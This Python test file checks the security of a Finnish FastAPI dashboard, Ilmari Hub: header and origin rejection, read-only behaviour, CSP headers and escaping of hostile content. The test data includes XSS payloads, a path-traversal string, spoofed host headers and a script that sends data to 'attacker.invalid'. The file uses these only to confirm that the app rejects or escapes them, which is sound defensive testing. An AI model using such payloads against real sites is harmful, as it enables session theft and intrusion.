"""Black-box HTTP checks with manually authored publications and hostile inputs.

TestClient's absent client address represents the Unix socket boundary. Ordinary
TCP clients must fail even when they supply convincing identity headers.
"""

from __future__ import annotations

from datetime import UTC, date, datetime, timedelta
import json
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

from bs4 import BeautifulSoup
from fastapi.testclient import TestClient
import pytest

from ilmari_ui.app import Settings, create_app, format_time, series_chart
from ilmari_ui.runs import FILE_LIMITS

RUN_ID = "20261013-001914-yo-independent"
SKINS = ("arctic-command", "slate-electric", "nordic-paper", "aurora-lab")
PAGES = (
    "/hub",
    "/hub/keskustelu",
    "/hub/ajot",
    "/hub/hyvaksynnat",
    "/hub/sovellukset",
    "/hub/ideat",
    "/hub/jarjestelma",
    "/hub/asetukset",
)
APP_PAGES = tuple(f"/hub/sovellukset/{app}" for app in ("ravintopolku", "unicafe", "ideat", "jarvis"))


def test_series_at_start_of_calendar_does_not_break_home_chart():
    chart = series_chart({"kind": "time_series", "data": {
        "period_start": "0001-01-01", "period_end": "0001-01-02",
        "points": [{"date": "0001-01-01", "value": 8}, {"date": "0001-01-02", "value": None}],
    }}, 90)
    assert chart["total"] == 2
    assert chart["coverage"] == 1
    assert chart["points"][1]["missing"] is True


def test_published_negative_series_is_visible_instead_of_assuming_zero():
    chart = series_chart({"kind": "time_series", "data": {
        "period_start": "2026-10-12", "period_end": "2026-10-13",
        "points": [{"date": "2026-10-12", "value": -10}, {"date": "2026-10-13", "value": -5}],
    }})
    assert chart["coverage"] == 2
    assert all(35 <= point["y"] <= 170 for point in chart["points"])
    assert chart["points"][0]["value"] == -10


def local_client(settings: Settings | None = None) -> TestClient:
    return TestClient(create_app(settings), base_url="http://ilmari.local", client=None)


def soup(response) -> BeautifulSoup:
    return BeautifulSoup(response.text, "html.parser")


@pytest.fixture
def demo_client():
    with local_client(Settings(demo_enabled=True)) as client:
        yield client


@pytest.fixture
def publication(tmp_path: Path) -> Path:
    root = tmp_path / "published-runs"
    run = root / RUN_ID
    run.mkdir(parents=True)
    # Test keys deliberately do not invent an upstream MUODOT.md schema.
    (run / "meta.json").write_text(json.dumps({"test_note": "manually authored", "test_count": 2}), encoding="utf-8")
    (run / "raportti.md").write_text("# Riippumaton testiraportti\nJulkaistu havainto.\n", encoding="utf-8")
    (run / "ehdotukset.jsonl").write_text('{"test_note":"Rajattu ehdotus"}\n', encoding="utf-8")
    (run / "sol-tulos.json").write_text('{"test_result":"Tulosteksti"}', encoding="utf-8")
    (run / "luonnos.patch").write_text("--- a/example\n+++ b/example\n-old\n+new\n", encoding="utf-8")
    return root


def metric_payload() -> dict:
    now = datetime.now(UTC).replace(microsecond=0)
    return {
        "schema_version": "ilmari.card.v1", "app_id": "unicafe", "card_id": "test-card",
        "kind": "metric", "title": "Riippumaton julkaisukortti", "data_class": "public",
        "published_at": (now - timedelta(minutes=1)).isoformat(),
        "observed_until": (now - timedelta(minutes=2)).isoformat(),
        "fresh_until": (now + timedelta(days=1)).isoformat(),
        "source": {"name": "Käsin kirjoitettu testilähde", "url": None},
        "units": "kpl", "data": {"value": 17, "note": "Vain julkaistu yhteenveto"},
    }


def publish_card(root: Path, payload: dict) -> Path:
    folder = root / payload["app_id"]
    folder.mkdir(parents=True, exist_ok=True)
    filename = folder / f"{payload['card_id']}.json"
    filename.write_text(json.dumps(payload), encoding="utf-8")
    return filename


@pytest.mark.parametrize("field", ["runs_dir", "cards_dir"])
@pytest.mark.parametrize("root", [Path("relative-publication"), Path("/"), Path("/tmp/../publication")])
def test_publication_configuration_requires_a_specific_absolute_root(field, root):
    with pytest.raises(ValueError, match="absoluuttinen"):
        Settings(**{field: root})


@pytest.mark.parametrize("page", PAGES + APP_PAGES)
def test_every_documented_page_renders_in_live_and_demo_modes(demo_client, page):
    for query in ("", "?demo=1"):
        response = demo_client.get(page + query)
        assert response.status_code == 200
        dom = soup(response)
        assert dom.html["lang"] == "fi"
        assert dom.find("main", id="main") is not None
        assert dom.title.get_text().endswith("· Ilmari Hub")
        assert bool(dom.select(".demo-banner")) == bool(query)


@pytest.mark.parametrize("skin", SKINS)
def test_skin_demo_and_card_selection_survive_navigation(demo_client, skin):
    response = demo_client.get(f"/hub?skin={skin}&demo=1&home_cards=unicafe,ravintopolku")
    dom = soup(response)
    assert dom.html["data-skin"] == skin
    links = dom.select("nav a[href]")
    assert links
    for link in links:
        url = urlsplit(link["href"])
        if not url.path.startswith("/hub"):
            continue
        query = parse_qs(url.query)
        assert query["skin"] == [skin]
        assert query["demo"] == ["1"]
        assert query["home_cards"] == ["unicafe,ravintopolku"]
        destination = demo_client.get(link["href"])
        assert destination.status_code == 200
        assert soup(destination).html["data-skin"] == skin


@pytest.mark.parametrize("skin", ["not-a-theme", '<script>alert("skin")</script>', "", "ARCTIC-COMMAND"])
def test_unrecognized_skin_is_not_reflected_as_markup(demo_client, skin):
    response = demo_client.get("/hub", params={"skin": skin})
    assert response.status_code == 200
    assert soup(response).html["data-skin"] == "arctic-command"
    assert not soup(response).find("script")


def test_settings_offer_four_selectable_skins(demo_client):
    response = demo_client.get("/hub/asetukset?demo=1")
    dom = soup(response)
    selectable = set()
    for link in dom.select("main a[href]"):
        query = parse_qs(urlsplit(link["href"]).query)
        if "skin" in query:
            selectable.add(query["skin"][0])
    for select in dom.select("main select[name=skin]"):
        selectable.update(option["value"] for option in select.find_all("option"))
    assert set(SKINS) <= selectable


def test_assets_are_local_and_actually_load(demo_client):
    response = demo_client.get("/hub")
    dom = soup(response)
    assert not dom.find("script")
    assets = [link["href"] for link in dom.find_all("link", href=True) if link.get("rel") in (["stylesheet"], ["icon"])]
    assert assets
    for asset in assets:
        assert asset.startswith("/hub/static/")
        asset_response = demo_client.get(asset)
        assert asset_response.status_code == 200
        assert asset_response.content


def test_repository_root_redirects_to_the_hub_without_a_session_cookie(demo_client):
    response = demo_client.get("/", follow_redirects=False)
    assert response.status_code == 307
    assert response.headers["location"] == "/hub"
    assert "set-cookie" not in response.headers


def test_home_card_selection_is_deduplicated_and_allowlisted(demo_client):
    response = demo_client.get("/hub?demo=1&home_cards=unicafe,unicafe,unknown,../../secret")
    assert response.status_code == 200
    dom = soup(response)
    home_cards = dom.select("main .app-card")
    assert len(home_cards) == 1
    assert "UniCafe" in home_cards[0].get_text()
    assert "../../secret" not in response.text
    for link in dom.select("nav a[href]"):
        if urlsplit(link["href"]).path.startswith("/hub"):
            assert parse_qs(urlsplit(link["href"]).query)["home_cards"] == ["unicafe"]


def test_demo_is_disabled_by_default_and_live_has_no_fabricated_card_or_run(tmp_path):
    client = local_client(Settings(runs_dir=tmp_path / "absent", demo_enabled=False))
    response = client.get("/hub?demo=1")
    dom = soup(response)
    assert response.status_code == 200
    assert not dom.select(".demo-banner")
    assert "Synteettinen kehitysjulkaisu" not in response.text
    assert "Esimerkki: paahdettu kasviskulho" not in response.text
    assert "20261013-001914-yo-demo" not in response.text
    assert "ei yhdistetty" in response.text.lower()
    assert "Ei yhteyttä isäntäkoneen tilaan" in response.text


def test_demo_requires_explicit_query_opt_in(demo_client):
    live = demo_client.get("/hub")
    demo = demo_client.get("/hub?demo=1")
    assert not soup(live).select(".demo-banner")
    assert soup(demo).select(".demo-banner")
    assert "DEMO – ESIMERKKIDATA" in demo.text
    assert "Ei oikeita ajoja" in demo.text
    assert "Esimerkki: paahdettu kasviskulho" in demo.text


@pytest.mark.parametrize("method", ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE"])
@pytest.mark.parametrize("path", ["/hub", "/hub/hyvaksynnat", "/hub/keskustelu", "/hub/static/themes.css"])
def test_all_mutating_or_unneeded_methods_fail_closed(demo_client, method, path):
    response = demo_client.request(method, path, content='{"approve":true}')
    assert response.status_code == 403
    assert "Pääsy estetty" in response.text
    assert "set-cookie" not in response.headers


@pytest.mark.parametrize("headers", [
    {"host": "evil.org"}, {"host": "ilmari.local:80"}, {"host": "ILMARI.LOCAL"},
    {"host": "ilmari.local.evil.org"}, {"host": ""},
    [("host", "ilmari.local"), ("host", "evil.org")],
    [("host", "ilmari.local"), ("host", "ilmari.local")],
    {"origin": "https://evil.org"}, {"origin": "null"}, {"origin": "http://ilmari.local:80"},
    {"origin": "https://ilmari.local"},
    {"origin": "https://ilmari.local.evil.org"},
    [("origin", "http://ilmari.local"), ("origin", "https://evil.org")],
    [("origin", "http://ilmari.local"), ("origin", "http://ilmari.local")],
    {"sec-fetch-site": "cross-site"}, {"sec-fetch-site": "same-site"},
    [("sec-fetch-site", "same-origin"), ("sec-fetch-site", "cross-site")],
    [("sec-fetch-site", "same-origin"), ("sec-fetch-site", "same-origin")],
    {"tailscale-funnel-request": "true"}, {"tailscale-funnel-request": "false"},
])
def test_untrusted_host_origin_fetch_metadata_or_funnel_is_rejected(demo_client, headers):
    response = demo_client.get("/hub?demo=1", headers=headers)
    assert response.status_code == 403
    assert "Pääsy estetty" in response.text
    assert "Esimerkki: paahdettu kasviskulho" not in response.text


@pytest.mark.parametrize("headers", [
    {}, {"origin": "http://ilmari.local"},
    {"sec-fetch-site": "none"}, {"sec-fetch-site": "same-origin"},
])
def test_allowed_unix_origin_has_corresponding_happy_path(demo_client, headers):
    assert demo_client.get("/hub", headers=headers).status_code == 200


def test_https_origin_matches_https_request_scheme():
    client = TestClient(create_app(), base_url="https://ilmari.local", client=None)
    assert client.get("/hub", headers={"origin": "https://ilmari.local"}).status_code == 200
    assert client.get("/hub", headers={"origin": "http://ilmari.local"}).status_code == 403


@pytest.mark.parametrize("identity", [{}, {"tailscale-user-login": "owner@example.org"}, {"tailscale-user-login": "owner@example.org", "x-forwarded-host": "ilmari.local", "x-forwarded-for": "100.64.0.1", "x-forwarded-proto": "https"}])
def test_tcp_cannot_spoof_a_trusted_tailscale_identity(identity):
    client = TestClient(create_app(Settings(demo_enabled=True)), base_url="http://ilmari.local", client=("127.0.0.1", 12345))
    assert client.get("/hub?demo=1", headers=identity).status_code == 403


def test_security_headers_cover_success_denial_missing_pages_and_assets(demo_client):
    responses = (
        demo_client.get("/hub"), demo_client.get("/does-not-exist"),
        demo_client.get("/hub", headers={"host": "evil.org"}),
        demo_client.get("/hub/static/themes.css"),
    )
    for response in responses:
        policy = response.headers["content-security-policy"]
        for directive in ("default-src 'none'", "script-src 'none'", "connect-src 'none'", "frame-ancestors 'none'", "object-src 'none'", "base-uri 'none'"):
            assert directive in policy
        assert "unsafe-inline" not in policy and "https:" not in policy
        assert response.headers["cache-control"] == "no-store"
        assert response.headers["referrer-policy"] == "same-origin"
        assert response.headers["x-content-type-options"] == "nosniff"
        assert response.headers["x-frame-options"] == "DENY"
        assert "set-cookie" not in response.headers


def test_get_requests_never_modify_publications_or_claim_approval_authority(publication):
    before = {path.relative_to(publication): path.read_bytes() for path in publication.rglob("*") if path.is_file()}
    client = local_client(Settings(runs_dir=publication))
    for page in PAGES + APP_PAGES + (f"/hub/ajot/{RUN_ID}",):
        response = client.get(page)
        assert response.status_code == 200
        dom = soup(response)
        assert not dom.find_all("form", method=lambda method: method and method.lower() != "get")
        assert "set-cookie" not in response.headers
    after = {path.relative_to(publication): path.read_bytes() for path in publication.rglob("*") if path.is_file()}
    assert before == after
    approvals = soup(client.get("/hub/hyvaksynnat"))
    assert not approvals.select("button[type=submit]:not([disabled])")


def test_report_json_and_patch_render_as_plain_text_not_active_html(publication):
    marker = '<script>fetch("https://attacker.invalid/steal")</script>'
    run = publication / RUN_ID
    (run / "raportti.md").write_text(marker + '\n<img src=x onerror="alert(1)">', encoding="utf-8")
    (run / "meta.json").write_text(json.dumps({"test_xss": marker}), encoding="utf-8")
    (run / "ehdotukset.jsonl").write_text(json.dumps({"test_xss": marker}) + "\n", encoding="utf-8")
    (run / "sol-tulos.json").write_text(json.dumps({"test_xss": marker}), encoding="utf-8")
    (run / "luonnos.patch").write_text("+" + marker, encoding="utf-8")
    response = local_client(Settings(runs_dir=publication)).get(f"/hub/ajot/{RUN_ID}")
    assert response.status_code == 200
    dom = soup(response)
    assert not dom.find_all("script")
    assert not dom.find_all("img", onerror=True)
    assert marker in dom.get_text()
    assert "&lt;script&gt;" in response.text
    assert not dom.select("[onclick], [onerror], [onload]")


def test_card_title_notes_units_and_source_are_escaped(tmp_path):
    cards = tmp_path / "cards"
    payload = metric_payload()
    payload["title"] = '<img src=x onerror="alert(1)">'
    payload["source"]["name"] = '<svg onload="alert(2)">'
    payload["data"]["note"] = '<script>alert("note")</script>'
    payload["units"] = '<b>test</b>'
    publish_card(cards, payload)
    client = local_client(Settings(cards_dir=cards, runs_dir=tmp_path / "missing"))
    for page in ("/hub", "/hub/sovellukset/unicafe"):
        response = client.get(page)
        assert response.status_code == 200
        dom = soup(response)
        assert not dom.find_all("script")
        assert not dom.select("[onerror], [onload]")
        assert payload["source"]["name"] in dom.get_text()
        assert payload["data"]["note"] in dom.get_text()
        assert "&lt;svg" in response.text and "&lt;script" in response.text


@pytest.mark.parametrize("url", ["javascript:alert(1)", "https://evil.invalid/source", "http://example.org/source"])
def test_untrusted_source_url_does_not_become_a_link(tmp_path, url):
    cards = tmp_path / "cards"
    payload = metric_payload()
    payload["source"]["url"] = url
    publish_card(cards, payload)
    response = local_client(Settings(cards_dir=cards, allowed_source_hosts=frozenset({"example.org"}))).get("/hub/sovellukset/unicafe")
    assert response.status_code == 200
    assert not soup(response).find("a", href=url)
    assert payload["title"] not in response.text


def test_one_invalid_app_is_isolated_and_valid_public_card_stays_available(tmp_path):
    cards = tmp_path / "cards"
    publish_card(cards, metric_payload())
    bad = cards / "ravintopolku"
    bad.mkdir()
    (bad / "bad-card.json").write_text('{"secret":"must not leak" invalid', encoding="utf-8")
    settings = Settings(cards_dir=cards, allowed_private_apps=frozenset({"ravintopolku"}), runs_dir=tmp_path / "missing")
    response = local_client(settings).get("/hub")
    assert response.status_code == 200
    assert "Käsin kirjoitettu testilähde" in response.text
    assert "must not leak" not in response.text
    assert str(tmp_path) not in response.text


@pytest.mark.parametrize("path", ["/hub/ajot/unknown", "/hub/ajot/%2E%2E%2Fsecret", "/hub/sovellukset/unknown", "/missing"])
def test_missing_and_invalid_identifiers_have_safe_error_pages(demo_client, path):
    response = demo_client.get(path)
    assert response.status_code == 404
    assert soup(response).find("main", id="main")
    assert "Traceback" not in response.text and "/srv/aiops" not in response.text


def test_missing_malformed_and_oversized_report_files_do_not_crash_detail(publication):
    run = publication / RUN_ID
    (run / "raportti.md").unlink()
    (run / "meta.json").write_text("{not-json", encoding="utf-8")
    (run / "luonnos.patch").write_bytes(b"+" * (FILE_LIMITS["luonnos.patch"] + 1))
    response = local_client(Settings(runs_dir=publication)).get(f"/hub/ajot/{RUN_ID}")
    assert response.status_code == 200
    assert "+++" not in response.text
    assert "{not-json" not in response.text
    assert "Traceback" not in response.text and str(publication) not in response.text
    assert "Tulosteksti" in response.text


def test_default_read_model_does_not_infer_live_semantics_from_arbitrary_json(publication):
    path = publication / RUN_ID / "meta.json"
    path.write_text(json.dumps({"status": "APPROVED", "model": "SECRET-MODEL", "proposal_count": 424242, "demo_title": "FAKE-DEMO-TITLE", "demo_model": "FAKE-DEMO-MODEL"}), encoding="utf-8")
    response = local_client(Settings(runs_dir=publication)).get("/hub/ajot")
    assert response.status_code == 200
    assert RUN_ID in response.text
    assert all(marker not in response.text for marker in ("APPROVED", "SECRET-MODEL", "424242", "FAKE-DEMO-TITLE", "FAKE-DEMO-MODEL"))


def independent_series() -> dict:
    end = date(2026, 10, 13)
    start = end - timedelta(days=89)
    return {
        "kind": "time_series",
        "data": {
            "period_start": start.isoformat(), "period_end": end.isoformat(),
            "points": [
                {"date": start.isoformat(), "value": 1700},
                {"date": (end - timedelta(days=2)).isoformat(), "value": 2100},
                {"date": (end - timedelta(days=1)).isoformat(), "value": None},
                {"date": end.isoformat(), "value": 2200},
            ],
        },
    }


@pytest.mark.parametrize("days", [7, 30, 90])
def test_chart_windows_are_exact_and_never_connect_across_missing_days(days):
    chart = series_chart(independent_series(), days)
    assert chart["total"] == days
    assert len(chart["points"]) == days
    assert chart["coverage"] == (3 if days == 90 else 2)
    assert len(chart["segments"]) == (3 if days == 90 else 2)
    assert all(" " not in segment for segment in chart["segments"])
    assert chart["points"][-2]["missing"] is True
    assert chart["points"][-2]["value"] is None
    assert chart["points"][-2]["y"] is None
    assert chart["points"][-1]["label"] == "13.10.2026"


@pytest.mark.parametrize("days", ["7", "30", "90"])
def test_chart_range_links_and_accessible_missing_data_are_present(demo_client, days):
    response = demo_client.get(f"/hub/sovellukset/ravintopolku?demo=1&days={days}")
    assert response.status_code == 200
    dom = soup(response)
    chart = dom.find("svg", role="img")
    assert chart is not None
    assert "Katkos" in chart.get("aria-label", "")
    assert "Puuttuva tieto" in dom.get_text()
    assert dom.find("table") is not None
    query_days = {parse_qs(urlsplit(link["href"]).query).get("days", [None])[0] for link in dom.select("main a[href]")}
    assert {"7", "30", "90"} <= query_days


@pytest.mark.parametrize("value,expected", [
    ("2026-10-13T22:05:00Z", "14.10.2026 klo 01.05"),
    ("2026-01-13T22:05:00Z", "14.01.2026 klo 00.05"),
    ("2026-10-13T22:05:00+03:00", "13.10.2026 klo 22.05"),
    ("2026-10-13T22:05:00", "Ei saatavilla"),
    ("invalid", "Ei saatavilla"), (None, "Ei saatavilla"),
])
def test_display_timestamps_use_helsinki_and_reject_ambiguous_times(value, expected):
    assert format_time(value) == expected
